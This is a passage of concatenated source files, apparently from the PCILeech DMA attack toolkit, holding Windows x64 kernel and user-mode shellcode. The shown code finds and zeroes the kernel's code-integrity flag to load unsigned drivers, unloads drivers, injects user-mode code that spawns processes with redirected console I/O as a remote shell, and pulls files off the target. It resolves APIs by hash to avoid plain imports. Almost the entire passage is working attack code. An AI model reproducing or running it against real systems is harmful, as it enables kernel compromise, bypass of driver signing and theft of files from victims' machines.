		{ &fnk2->ZwLoadDriver,						H_ZwLoadDriver },
		{ &fnk2->ZwSetValueKey,						H_ZwSetValueKey },
	};
	for(QWORD j = 0; j < (sizeof(FUNC2) / sizeof(QWORD[2])); j++) {
		*(PQWORD)FUNC2[j][0] = PEGetProcAddressH(qwNtosBase, (DWORD)FUNC2[j][1]);
	}
}

//----------------------------------------------------------------------------------------------------------

/*
* Check if the file exists - if so return a PUNICODE_STRING containing the file name.
* NB! the pusImagePath parameter must be free'd by RtlFreeUnicodeString by caller upon success.
*/
NTSTATUS DriverRegGetImagePath(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _Out_ PUNICODE_STRING pusImagePath)
{
	NTSTATUS nt;
	HANDLE hFile = NULL;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	ANSI_STRING _sa;
	UNREFERENCED_PARAMETER(fnk2);
	// check if file exists
	fnk->RtlInitAnsiString(&_sa, pk->dataInStr);
	fnk->RtlCopyMemory(pk->dataOutStr, pk->dataInStr, 260);
	fnk->RtlAnsiStringToUnicodeString(pusImagePath, &_sa, TRUE);
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(&_oa, pusImagePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = fnk->ZwCreateFile(&hFile, GENERIC_READ, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(hFile) {
		fnk->ZwClose(hFile);
	}
	if(NT_ERROR(nt)) {
		fnk->RtlFreeUnicodeString(pusImagePath);
		return nt;
	}
	return ERROR_SUCCESS;
}

/*
* Get the Name (data after last \) given a null terminated string.
*/
LPWSTR DriverRegGetImageNameFromPath(LPWSTR wszSrc)
{
	DWORD i = 0, j = 0;
	while(wszSrc[i] != 0) {
		if(wszSrc[i] == '\\') {
			j = i + 1;
		}
		i++;
	}
	return &wszSrc[j];
}

/*
* Set required values into a service registry key
*/
VOID DriverRegSetServiceKeys(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ HANDLE hKeyHandle, _In_ PUNICODE_STRING pusImagePath)
{
	WCHAR WSZ_ErrorControl[] = { 'E', 'r', 'r', 'o', 'r', 'C', 'o', 'n', 't', 'r', 'o', 'l', 0 };
	WCHAR WSZ_ImagePath[] = { 'I', 'm', 'a', 'g', 'e', 'P', 'a', 't', 'h', 0 };
	WCHAR WSZ_Start[] = { 'S', 't', 'a', 'r', 't', 0 };
	WCHAR WSZ_Type[] = { 'T', 'y', 'p', 'e', 0 };
	DWORD dwValue0 = 0, dwValue1 = 1, dwValue3 = 3;
	UNICODE_STRING usErrorControl, usImagePath, usStart, usType;
	UNREFERENCED_PARAMETER(pk);
	UNREFERENCED_PARAMETER(fnk2);
	fnk->RtlInitUnicodeString(&usErrorControl, WSZ_ErrorControl);
	fnk->RtlInitUnicodeString(&usImagePath, WSZ_ImagePath);
	fnk->RtlInitUnicodeString(&usStart, WSZ_Start);
	fnk->RtlInitUnicodeString(&usType, WSZ_Type);
	fnk2->ZwSetValueKey(hKeyHandle, &usStart, 0, REG_DWORD, (PVOID)&dwValue3, sizeof(DWORD)); // 3 = Load on Demand
	fnk2->ZwSetValueKey(hKeyHandle, &usType, 0, REG_DWORD, (PVOID)&dwValue1, sizeof(DWORD)); // 1 = Kernel Device Driver
	fnk2->ZwSetValueKey(hKeyHandle, &usErrorControl, 0, REG_DWORD, (PVOID)&dwValue0, sizeof(DWORD)); // 0 = Do not show warning
	fnk2->ZwSetValueKey(hKeyHandle, &usImagePath, 0, REG_SZ, pusImagePath->Buffer, pusImagePath->Length + 2);
}

/*
* Try create a registry service that may be used by ZwLoadDriver to load a driver.
*/
NTSTATUS DriverRegCreateService(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _Out_ WCHAR wszServicePath[MAX_PATH])
{
	NTSTATUS nt;
	WCHAR WSZ_ServicePathBase[] = { '\\', 'R', 'e', 'g', 'i', 's', 't', 'r', 'y', '\\',  'M', 'a', 'c', 'h', 'i', 'n', 'e', '\\', 'S', 'y', 's', 't', 'e', 'm', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'C', 'o', 'n', 't', 'r', 'o', 'l', 'S', 'e', 't', '\\', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 's', '\\', 0 };
	UNICODE_STRING usRegPath, usImagePath;
	OBJECT_ATTRIBUTES _oaReg;
	LPWSTR wszImageName;
	HANDLE hKeyHandle;
	// fetch image name and path
	nt = DriverRegGetImagePath(pk, fnk, fnk2, &usImagePath);
	if(NT_ERROR(nt)) {
		return nt;
	}
	wszImageName = DriverRegGetImageNameFromPath(usImagePath.Buffer);
	fnk->RtlCopyMemory(wszServicePath, WSZ_ServicePathBase, sizeof(WSZ_ServicePathBase) + 2);
	fnk2->wcscat(wszServicePath, wszImageName);
	fnk->RtlInitUnicodeString(&usRegPath, wszServicePath);
	// create the reg key
	InitializeObjectAttributes(&_oaReg, &usRegPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = fnk2->ZwCreateKey(&hKeyHandle, KEY_ALL_ACCESS, &_oaReg, 0, NULL, REG_OPTION_VOLATILE, NULL);
	if(NT_SUCCESS(nt)) {
		DriverRegSetServiceKeys(pk, fnk, fnk2, hKeyHandle, &usImagePath);
	}
	fnk->RtlFreeUnicodeString(&usImagePath);
	fnk->ZwClose(hKeyHandle);
	return nt;
}

/*
* Retrieve the address of the code integrity flag
* see: https://github.com/hfiref0x/DSEFix/blob/master/Source/ci-hunter
*/
QWORD GetAddr_g_CiEnabled(QWORD qwAddrModuleCi)
{
	QWORD qwA;
	DWORD i = 0, j = 0;
	qwA = PEGetProcAddressH(qwAddrModuleCi, H_CiInitialize);
	if(!qwA) {
		return 0;
	}
	do {
		// JMP to CiInitialize sub function
		// TODO: add proper dasm instead of trivial opcode-scanning
		if(*(PBYTE)(qwA + i) == 0xE9) {
			qwA = qwA + i + 5 + *(PLONG)(qwA + i + 1);
			do {
				// Scan for MOV to g_CiEnabled
				if(*(PUSHORT)(qwA + j) == 0x0D89) {
					return qwA + j + 6 + *(PLONG)(qwA + j + 2);
				}
				j++;
			} while(j < 256);
			return 0;
		}
		i++;
	} while(i < 128);
	return 0;
}

/*
* Load a driver by service name.
*/
NTSTATUS DriverLoadByServiceName(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
{
	NTSTATUS nt;
	ANSI_STRING saServicePath;
	UNICODE_STRING usServicePath;
	fnk->RtlCopyMemory(pk->dataOutStr, pk->dataInStr, MAX_PATH);
	fnk->RtlInitAnsiString(&saServicePath, pk->dataInStr);
	fnk->RtlAnsiStringToUnicodeString(&usServicePath, &saServicePath, TRUE);
	nt = fnk2->ZwLoadDriver(&usServicePath);
	fnk->RtlFreeUnicodeString(&usServicePath);
	return nt;
}

/*
* Load a driver by image path by creating a mock service, load the driver and then deleting the mock service.
*/
NTSTATUS DriverLoadByImagePath(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
{
	NTSTATUS nt;
	WCHAR wszServicePath[MAX_PATH];
	UNICODE_STRING usServicePath;
	DWORD i;
	nt = DriverRegCreateService(pk, fnk, fnk2, wszServicePath);
	if(NT_ERROR(nt)) {
		return nt;
	}
	for(i = 0; i < MAX_PATH; i++) {
		pk->dataOutStr[i] = (CHAR)wszServicePath[i];
	}
	fnk->RtlInitUnicodeString(&usServicePath, wszServicePath);
	return fnk2->ZwLoadDriver(&usServicePath);
}

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	CHAR C_CI[] = { 'c', 'i', '.', 'd', 'l', 'l', 0 };
	KERNEL_FUNCTIONS ofnk;
	KERNEL_FUNCTIONS2 ofnk2;
	LPSTR s = pk->dataInStr;
	QWORD qwAddrModuleCI;
	PQWORD pqwModuleCI_g_PG = NULL;
	QWORD qwModuleCI_g_PG_Orig = 0;
	if(s[0] != '\\') {
		pk->dataOut[0] = ERROR_INVALID_PARAMETER;
		return;
	}
	// initialize kernel functions
	InitializeKernelFunctions(pk->AddrKernelBase, &ofnk);
	InitializeKernelFunctions2(pk->AddrKernelBase, &ofnk2);
	// disable code signing
	qwAddrModuleCI = KernelGetModuleBase(&ofnk, C_CI);
	if(!qwAddrModuleCI) {
		pk->dataOut[0] = ERROR_MISSING_SYSTEMFILE;
		return;
	}
	pqwModuleCI_g_PG = (PQWORD)GetAddr_g_CiEnabled(qwAddrModuleCI);
	qwModuleCI_g_PG_Orig = *pqwModuleCI_g_PG;
	*pqwModuleCI_g_PG = 0;
	if((s[1] == 'r' || s[1] == 'R') && (s[2] == 'e' || s[2] == 'E') && (s[3] == 'g' || s[3] == 'G')) {
		// load from registry path
		pk->dataOut[0] = DriverLoadByServiceName(pk, &ofnk, &ofnk2);
	}
	else {
		// load from image path
		pk->dataOut[0] = DriverLoadByImagePath(pk, &ofnk, &ofnk2);
	}
	// restore code signing to original state
	*pqwModuleCI_g_PG = qwModuleCI_g_PG_Orig;
}
```

`pcileech_shellcode/wx64_driverunload.c`:

```c
// wx64_driverunload.c : kernel code to unload already loaded drivers.
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_driverunload.c
// ml64.exe wx64_common_a.asm /Fewx64_driverunload.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_driverunload.obj wx64_common.obj
// shellcode64 -o wx64_driverunload.exe "KERNEL MODULE UNLOADER - UNLOAD DRIVERS BY SERVICE NAME!             \n=====================================================================\nUnloads unsigned or signed drivers by registry service name.         \nNB! Unloading a driver may cause the system to become unstable and   \nmay trigger a bluescreen!                                            \nREQUIRED OPTIONS:                                                    \n  -s : service name.                                                 \n       Example:                                                      \n       "\Registry\Machine\System\CurrentControlSet\Services\mydriver"\n===== MODULE LOAD STATUS (RESULT) ===================================\nLOAD NTSTATUS : %s0x%08X                                             \n=====================================================================\n"
//  
#include "wx64_common.h"

//----------------------------------------------------------------------------------------------------------

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	ANSI_STRING saDriverServiceName;
	UNICODE_STRING suDriverServiceName;
	NTSTATUS(*fnZwUnloadDriver)(_In_ PUNICODE_STRING DriverServiceName);
	KERNEL_FUNCTIONS ofnk;
	// initialize kernel functions
	InitializeKernelFunctions(pk->AddrKernelBase, &ofnk);
	fnZwUnloadDriver = PEGetProcAddressH(pk->AddrKernelBase, H_ZwUnloadDriver);
	// try unload driver
	ofnk.RtlInitAnsiString(&saDriverServiceName, pk->dataInStr);
	ofnk.RtlAnsiStringToUnicodeString(&suDriverServiceName, &saDriverServiceName, TRUE);
	pk->dataOut[0] = fnZwUnloadDriver(&suDriverServiceName);
	ofnk.RtlFreeUnicodeString(&suDriverServiceName);
}
```

`pcileech_shellcode/wx64_exec_user.asm`:

```asm
; wx64_exec_user.asm : assembly to receive execution from APC in user mode.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN c_EntryPoint:NEAR

.CODE

main PROC
	label_main_base:
	; ----------------------------------------------------
	; 1: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LEA rcx, data_cmpxchg_flag
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
    ; ----------------------------------------------------
	; 2: Fetch code address
	; ----------------------------------------------------
	LEA rcx, label_main_base
	AND rcx, 0fffffffffffff000h
    ; ----------------------------------------------------
	; 3: Fetch KERNEL32 address
	; ----------------------------------------------------
	MOV  rdx, GS:[30h]    ; TEB
	MOV  rdx, [rdx + 60h] ; PEB
	MOV  rdx, [rdx + 18h] ; LDR
	MOV  rdx, [rdx + 20h] ; LIST_LOADED_MODULES
	MOV  rdx, [rdx]       ; NTDLL
	MOV  rdx, [rdx]       ; KERNEL32
	MOV  rdx, [rdx + 20h] ; ADDR of KERNEL32
    ; ----------------------------------------------------
	; 4: Call c-code and return
	; ----------------------------------------------------
	PUSH rsi
	MOV rsi, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL c_EntryPoint
	MOV rsp, rsi
	POP rsi
	skipcall:
	RET
main ENDP

data_cmpxchg_flag		db 00h

END

```

`pcileech_shellcode/wx64_exec_user_c.c`:

```c
// wx64_exec_user_c.c : usermode code to be injected into user process to spawn new processes.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC wx64_exec_user_c.c
// ml64 wx64_exec_user.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_exec_user_c.obj
// shellcode64.exe -o wx64_exec_user.exe
//

// pb buffer memory map as per below:
// 3 pages in total. Buffer begins at page boundry.
// page 1: Read/Execute - executable part
//         layout:
//         0..n       = executable code (this executable shellcode)
//         ..         = empty space
//         m..0xfff   = USERSHELL_CONFIG struct
//
// If console redirection is enabled a separate buffer is allocated
// and is as follows.
// page 2: Read/Write     - input part (input to targeted console window)
//         0..n           = USERSHELL_BUFFER_IO struct
//         n+1..n+1+0x800 = input buffer
// page 3: Read/Write     - output part (output from targeted console window)
//         0..n           = USERSHELL_BUFFER_IO struct
//         n+1..n+1+0x800 = output buffer

#include <windows.h>

typedef unsigned __int64		QWORD, *PQWORD;

#define USERSHELL_BUFFER_IO_MAGIC       0x012651232dfef9521
#define USERSHELL_BUFFER_IO_MAGIC_EXIT  0x0feda22001337daac
#define USERSHELL_BUFFER_IO_SIZE        0x800
typedef struct tUSERSHELLBUFFERIO {
	QWORD qwMagic;
	QWORD cbRead;
	QWORD cbReadAck;
	QWORD qwDebug[10];
	BYTE  pb[];
} USERSHELL_BUFFER_IO, *PUSERSHELL_BUFFER_IO;

typedef struct tdUserShellConfig {
	CHAR  szProcToStart[MAX_PATH];
	QWORD qwAddrConsoleBuffer;
	DWORD fCreateProcess;
} USERSHELL_CONFIG, *PUSERSHELL_CONFIG;

#define H_CloseHandle				0x0ffd97fb
#define H_CreatePipe				0x170c8f80
#define H_CreateProcessA			0x16b3fe72
#define H_CreateThread				0xca2bd06b
#define H_GetExitCodeProcess		0xac30ab74
#define H_LocalAlloc				0x4c0297fa
#define H_ReadFile					0x10fa6516
#define H_Sleep						0xdb2d49b0
#define H_WriteFile					0xe80a791f

typedef struct tdUserShellFunctions {
	BOOL(*CloseHandle)(
		_In_ HANDLE hObject
		);
	BOOL(*CreatePipe)(
		_Out_    PHANDLE               hReadPipe,
		_Out_    PHANDLE               hWritePipe,
		_In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes,
		_In_     DWORD                 nSize
		);
	BOOL(*CreateProcessA)(
		_In_opt_    LPCSTR                lpApplicationName,
		_Inout_opt_ LPSTR                 lpCommandLine,
		_In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,
		_In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,
		_In_        BOOL                  bInheritHandles,
		_In_        DWORD                 dwCreationFlags,
		_In_opt_    LPVOID                lpEnvironment,
		_In_opt_    LPCSTR                lpCurrentDirectory,
		_In_        LPSTARTUPINFO         lpStartupInfo,
		_Out_       LPPROCESS_INFORMATION lpProcessInformation
		);
	HANDLE(*CreateThread)(
		_In_opt_  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
		_In_      SIZE_T                 dwStackSize,
		_In_      LPTHREAD_START_ROUTINE lpStartAddress,
		_In_opt_  LPVOID                 lpParameter,
		_In_      DWORD                  dwCreationFlags,
		_Out_opt_ LPDWORD                lpThreadId
		);
	BOOL(*GetExitCodeProcess)(
		_In_  HANDLE  hProcess,
		_Out_ LPDWORD lpExitCode
		);
	HLOCAL(*LocalAlloc)(
		_In_ UINT   uFlags,
		_In_ SIZE_T uBytes
		);
	BOOL(*ReadFile)(
		_In_        HANDLE       hFile,
		_Out_       LPVOID       lpBuffer,
		_In_        DWORD        nNumberOfBytesToRead,
		_Out_opt_   LPDWORD      lpNumberOfBytesRead,
		_Inout_opt_ LPOVERLAPPED lpOverlapped
		);
	VOID(*Sleep)(
		_In_ DWORD dwMilliseconds
		);
	BOOL(*WriteFile)(
		_In_        HANDLE       hFile,
		_In_        LPCVOID      lpBuffer,
		_In_        DWORD        nNumberOfBytesToWrite,
		_Out_opt_   LPDWORD      lpNumberOfBytesWritten,
		_Inout_opt_ LPOVERLAPPED lpOverlapped
		);
} USERSHELL_FUNCTIONS, *PUSERSHELL_FUNCTIONS;

typedef struct tdUserShellData {
	PUSERSHELL_CONFIG pCfg;
	USERSHELL_FUNCTIONS fnu;
	HANDLE hInWrite;
	HANDLE hOutRead;
	HANDLE hOutWriteCP;
	HANDLE hInReadCP;
	PUSERSHELL_BUFFER_IO pInfoIn;
	PUSERSHELL_BUFFER_IO pInfoOut;
	HANDLE hProcessHandle;
	BOOL bThreadIsActive;
	DWORD dwDebugData;
} USERSHELL_DATA, *PUSERSHELL_DATA;

DWORD HashROR13A(_In_ LPCSTR sz)
{
	DWORD dwVal, dwHash = 0;
	while(*sz) {
		dwVal = (DWORD)*sz++;
		dwHash = (dwHash >> 13) | (dwHash << 19);
		dwHash += dwVal;
	}
	return dwHash;
}

PVOID PEGetProcAddressH(_In_ HMODULE hModuleIn, _In_ DWORD dwProcNameH)
{
	ULONG_PTR hModule = (ULONG_PTR)hModuleIn;
	PDWORD pdwRVAAddrNames, pdwRVAAddrFunctions;
	PWORD pwNameOrdinals;
	DWORD i, dwFnIdx, dwHash;
	LPSTR sz;
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule; // dos header.
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(hModule + dosHeader->e_lfanew); // nt header
	PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hModule);
	pdwRVAAddrNames = (PDWORD)(hModule + exp->AddressOfNames);
	pwNameOrdinals = (PWORD)(hModule + exp->AddressOfNameOrdinals);
	pdwRVAAddrFunctions = (PDWORD)(hModule + exp->AddressOfFunctions);
	for(i = 0; i < exp->NumberOfNames; i++) {
		sz = (LPSTR)(hModule + pdwRVAAddrNames[i]);
		dwHash = HashROR13A(sz);
		if(dwHash == dwProcNameH) {
			dwFnIdx = pwNameOrdinals[i];
			return (PVOID)(hModule + pdwRVAAddrFunctions[dwFnIdx]);
		}
	}
	return 0;
}

VOID UserShellInitializeFunctions(_In_ HMODULE hModuleKernel32, _Out_ PUSERSHELL_FUNCTIONS fnu)
{
	DWORD i = 0, NAMES[9];
	NAMES[i++] = H_CloseHandle;
	NAMES[i++] = H_CreatePipe;
	NAMES[i++] = H_CreateProcessA;
	NAMES[i++] = H_CreateThread;
	NAMES[i++] = H_GetExitCodeProcess;
	NAMES[i++] = H_LocalAlloc;
	NAMES[i++] = H_ReadFile;
	NAMES[i++] = H_Sleep;
	NAMES[i++] = H_WriteFile;
	while(i) {
		i--;
		*((PQWORD)fnu + i) = (QWORD)PEGetProcAddressH(hModuleKernel32, NAMES[i]);
	}
}

BOOL UserShellIsProcessRunning(PUSERSHELL_DATA pd)
{
	DWORD dwExit;
	return pd->fnu.GetExitCodeProcess(pd->hProcessHandle, &dwExit) && (dwExit == STILL_ACTIVE);
}

VOID UserShellCleanup(PUSERSHELL_DATA pd)
{
	pd->pInfoOut->qwMagic = 0;
	if(pd->bThreadIsActive) {
		pd->bThreadIsActive = FALSE;
		pd->fnu.CloseHandle(pd->hOutRead);
		pd->fnu.CloseHandle(pd->hInWrite);
		pd->fnu.CloseHandle(pd->hOutWriteCP);
		pd->fnu.CloseHandle(pd->hInReadCP);
	}
	pd->pInfoIn->qwMagic = USERSHELL_BUFFER_IO_MAGIC_EXIT;
	pd->pInfoOut->qwMagic = USERSHELL_BUFFER_IO_MAGIC_EXIT;
}

/*
* Execute binary specified in configuration
*/
BOOL UserShellExec(_Inout_ PUSERSHELL_DATA pd)
{
	LPSTARTUPINFO psi = pd->fnu.LocalAlloc(LMEM_ZEROINIT, sizeof(STARTUPINFO));
	PROCESS_INFORMATION pi;
	// set up data
	psi->cb = sizeof(STARTUPINFO);
	psi->dwFlags = STARTF_USESTDHANDLES;
	if(pd->pCfg->qwAddrConsoleBuffer) {
		psi->hStdOutput = pd->hOutWriteCP;
		psi->hStdInput = pd->hInReadCP;
		psi->hStdError = pd->hOutWriteCP;
	}
	// launch executable
	if(!pd->fnu.CreateProcessA(NULL, pd->pCfg->szProcToStart, NULL, NULL, TRUE, pd->pCfg->fCreateProcess, NULL, NULL, psi, &pi)) {
		return FALSE;
	}
	pd->hProcessHandle = pi.hProcess;
	if(pd->pCfg->qwAddrConsoleBuffer) {
		pd->fnu.CloseHandle(pi.hThread);
	}
	return TRUE;
}

// in buffer -> child process
VOID UserShellThreadWriter(PUSERSHELL_DATA pd)
{
	DWORD cbWrite, cbModulo, cbModuloAck;
	while(pd->bThreadIsActive && UserShellIsProcessRunning(pd)) {
		if(pd->pInfoIn->cbRead == pd->pInfoOut->cbReadAck) {
			pd->fnu.Sleep(10);
			continue;
		}
		cbModulo = pd->pInfoIn->cbRead % USERSHELL_BUFFER_IO_SIZE;
		cbModuloAck = pd->pInfoOut->cbReadAck % USERSHELL_BUFFER_IO_SIZE;
		if(cbModuloAck < cbModulo) {
			if(!pd->fnu.WriteFile(pd->hInWrite, pd->pInfoIn->pb + cbModuloAck, cbModulo - cbModuloAck, &cbWrite, NULL)) {
				break;
			}
		}
		else {
			if(!pd->fnu.WriteFile(pd->hInWrite, pd->pInfoIn->pb + cbModuloAck, USERSHELL_BUFFER_IO_SIZE - cbModuloAck, &cbWrite, NULL)) {
				break;
			}
		}
		pd->pInfoOut->cbReadAck += cbWrite;
	}
	UserShellCleanup(pd);
}

// child process -> out buffer
VOID UserShellThreadReader(PUSERSHELL_DATA pd)
{
	DWORD cbRead, cbModulo, cbModuloAck;
	while(pd->bThreadIsActive && UserShellIsProcessRunning(pd)) {
		cbModulo = pd->pInfoOut->cbRead % USERSHELL_BUFFER_IO_SIZE;
		cbModuloAck = pd->pInfoIn->cbReadAck % USERSHELL_BUFFER_IO_SIZE;
		if(cbModuloAck <= cbModulo) {
			if(!pd->fnu.ReadFile(pd->hOutRead, pd->pInfoOut->pb + cbModulo, USERSHELL_BUFFER_IO_SIZE - cbModulo, &cbRead, NULL)) {
				break;
			}
		} else {
			if(!pd->fnu.ReadFile(pd->hOutRead, pd->pInfoOut->pb + cbModulo, cbModuloAck - cbModuloAck, &cbRead, NULL)) {
				break;
			}
		}
		pd->pInfoOut->cbRead += cbRead;
		while(((pd->pInfoOut->cbRead - pd->pInfoIn->cbReadAck) >= USERSHELL_BUFFER_IO_SIZE) && pd->bThreadIsActive && UserShellIsProcessRunning(pd)) {
			pd->fnu.Sleep(10);
		}
	}
	UserShellCleanup(pd);
}

VOID c_EntryPoint(PBYTE pb, ULONG_PTR lpBaseKernel32)
{
	HLOCAL(*fnLocalAlloc)(UINT, SIZE_T);
	PUSERSHELL_DATA pd;
	SECURITY_ATTRIBUTES sa;
	BOOL result;
	// set up USERSHELL_DATA struct
	fnLocalAlloc = PEGetProcAddressH(lpBaseKernel32, H_LocalAlloc);
	pd = fnLocalAlloc(LMEM_ZEROINIT, sizeof(USERSHELL_DATA));
	pd->pCfg = (PUSERSHELL_CONFIG)(pb + 0x1000 - sizeof(USERSHELL_CONFIG));
	UserShellInitializeFunctions(lpBaseKernel32, &pd->fnu);
	// Intialize console redirection #1/2
	if(pd->pCfg->qwAddrConsoleBuffer) {
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		pd->pInfoIn = (PUSERSHELL_BUFFER_IO)pd->pCfg->qwAddrConsoleBuffer;
		pd->pInfoOut = (PUSERSHELL_BUFFER_IO)(pd->pCfg->qwAddrConsoleBuffer + 0x1000);
		pd->pInfoIn->qwMagic = USERSHELL_BUFFER_IO_MAGIC;
		pd->pInfoOut->qwMagic = USERSHELL_BUFFER_IO_MAGIC;
		result = pd->fnu.CreatePipe(&pd->hInReadCP, &pd->hInWrite, &sa, 0x800);
		pd->fnu.CreatePipe(&pd->hOutRead, &pd->hOutWriteCP, &sa, 0x800);
		pd->bThreadIsActive = TRUE;
	}
	// create process
	if(!UserShellExec(pd)) {
		UserShellCleanup(pd);
		return;
	}
	// Initalize console redirection #2/2
	if(pd->pCfg->qwAddrConsoleBuffer) {
		pd->fnu.CreateThread(NULL, 0, &UserShellThreadWriter, pd, 0, NULL);
		pd->fnu.CreateThread(NULL, 0, &UserShellThreadReader, pd, 0, NULL);
	}
}

```

`pcileech_shellcode/wx64_filepull.c`:

```c
// wx64_filepull.c : kernel code to pull files from target system.
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_filepull.c
// ml64 wx64_common_a.asm /Fewx64_filepull.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_filepull.obj wx64_common.obj
// shellcode64.exe -o wx64_filepull.exe "PULL FILES FROM TARGET SYSTEM                                  \n===============================================================\nPull a file from the target system to the local system.        \nREQUIRED OPTIONS:                                              \n  -out : file on local system to write result to.              \n         filename is given in normal format.                   \n         Example: '-out c:\temp\myexefile.exe'                 \n  -s   : file on target system.                                \n         filename is given in kernel format (\??\-prefix)      \n         Example: '-s \??\c:\program files\myexefile.exe'      \n===== PULL ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nNTSTATUS      : 0x%08X\n===============================================================\n"
// 
#include "wx64_common.h"

#define STATUS_UNSUCCESSFUL						0xC0000001
#define OBJ_CASE_INSENSITIVE    				0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT			0x00000020
#define FILE_OPEN								0x00000001
#define FILE_OVERWRITE_IF						0x00000005
#define OBJ_KERNEL_HANDLE       				0x00000200

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	NTSTATUS nt;
	HANDLE hFile;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	ANSI_STRING _sa;
	UNICODE_STRING _su;
	KERNEL_FUNCTIONS ofnk;
	PKERNEL_FUNCTIONS fnk;
	BOOL isModeLargeTransfer = FALSE;
	if(!pk->dataInStr[0]) {
		pk->dataOut[0] = (QWORD)STATUS_UNSUCCESSFUL;
		return;
	}
	// initialize kernel functions and strings
	InitializeKernelFunctions(pk->AddrKernelBase, &ofnk);
	fnk = &ofnk;
	fnk->RtlInitAnsiString(&_sa, pk->dataInStr);
	fnk->RtlCopyMemory(pk->dataOutStr, pk->dataInStr, 260);
	fnk->RtlAnsiStringToUnicodeString(&_su, &_sa, TRUE);
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(
		&_oa,
		&_su,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);
	// open, write and close file.
	if(fnk->KeGetCurrentIrql() != PASSIVE_LEVEL) {
		pk->dataOut[0] = (QWORD)STATUS_UNSUCCESSFUL;
		goto cleanup;
	}
	nt = fnk->ZwCreateFile(&hFile, GENERIC_READ, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(0 != nt) {
		pk->dataOut[0] = nt;
		goto cleanup;
	}
	do {
		nt = fnk->ZwReadFile(hFile, NULL, NULL, NULL, &_io, (PVOID)(pk->DMAAddrVirtual + pk->dataOutExtraOffset), (ULONG)pk->dataOutExtraLengthMax, NULL, 0);
		if(NT_ERROR(nt)) { break; }
		pk->dataOutExtraLength = (QWORD)_io.Information;
		if(pk->dataOutExtraLength != pk->dataOutExtraLengthMax) { break; }
		isModeLargeTransfer = TRUE;
	} while(WriteLargeOutput_WaitNext(fnk, pk));
	fnk->ZwClose(hFile);
	if(isModeLargeTransfer) { 
		WriteLargeOutput_Finish(fnk, pk); 
	}
	pk->dataOut[0] = nt;
cleanup:
	fnk->RtlFreeUnicodeString(&_su);
}

```

`pcileech_shellcode/wx64_filepush.c`:

```c
// wx64_filepush.c : kernel code to push files to target system.
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
